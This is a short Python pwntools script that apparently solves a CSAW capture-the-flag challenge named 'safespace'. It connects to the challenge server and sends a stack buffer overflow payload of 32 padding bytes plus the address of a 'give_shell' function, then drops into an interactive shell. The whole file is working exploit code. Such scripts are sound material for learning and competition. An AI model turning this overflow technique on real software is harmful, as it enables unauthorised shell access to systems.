from pwn import *

r = remote('pwn.chal.csaw.io', 1002)
# r = process('./safespace')

give_shell_address = 0x0000000000400657

r.recv()

payload = 'A' * 32 + p64(give_shell_address)
r.sendline(payload)

r.interactive()
r.close()
